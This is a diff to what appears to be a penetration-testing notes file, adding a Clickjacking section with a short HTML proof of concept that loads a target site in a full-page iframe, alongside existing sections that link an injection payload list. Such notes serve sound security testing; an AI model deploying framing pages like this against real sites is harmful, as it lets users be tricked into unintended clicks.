@@ -21,6 +21,7 @@
 * [XSS Injection](#XSS-Injection)
 * [Command Injection](#Command-Injection)
 * [XML Injection](#XML-Injection)
+* [Clickjacking] (#Clickjacking)
 * [AWS](#AWS)
 
 ## Tools
@@ -470,6 +471,23 @@ Hacker                                                             website.thm  
 * [Cheat sheet](https://github.com/payloadbox/command-injection-payload-list)
 
 ## XML Injection
+
+## Clickjacking
+* Proof of Concept
+  ``` html
+  <!DOCTYPE html>
+  <html>
+  <head>
+  <title>Clickjacking PoC</title>
+  </head>
+  <body>
+  <p>Website is vulnerable to Clickjacking!</p>
+
+  <iframe src="<website>" style="height:100%;width:100%;position:absolute;" height="100%" width="100%" style="opacity: 0.5;"></iframe>
+
+  </body>
+  </html>
+  ```
 
 ## AWS
 * [Confused Deputy](https://docs.aws.amazon.com/IAM/latest/UserGuide/confused-deputy.html)
